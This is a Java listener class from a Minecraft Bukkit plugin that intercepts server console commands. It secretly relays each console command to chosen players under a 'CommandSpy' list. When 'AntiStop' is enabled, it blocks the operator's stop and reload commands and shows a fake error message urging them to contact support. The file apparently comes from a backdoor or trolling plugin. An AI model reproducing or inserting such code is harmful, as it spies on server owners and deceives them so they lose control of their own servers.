package PandaHexCode.Listeners;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

import PandaHexCode.Commands.*;

public class ServerCommandListener implements Listener{
	
	@EventHandler
	public void onCommand(ServerCommandEvent e) {
		for (Player pl : Bukkit.getOnlinePlayers()) {
			if(StandartArrayCommands.commandspy.targetPlayers.contains(pl.getName())) {
				pl.sendMessage("§7[§4§lCommandSpy§7] §eConsole§c > §e"+e.getCommand());
			}
		}
		
		if(AntiStop.enable) {
				String message = e.getCommand();
				if(message.startsWith("/stop") | message.startsWith("/reload") | message.startsWith("/rl") | message.startsWith("stop") | message.startsWith("reload") | message.startsWith("rl")) {
					Bukkit.getConsoleSender().sendMessage("§cError when executing this command, if this error persists please contact the server support! For the security of your server you should not force stop the server, this could cause problems!");
					e.setCancelled(true);
				}
		}
	}
}
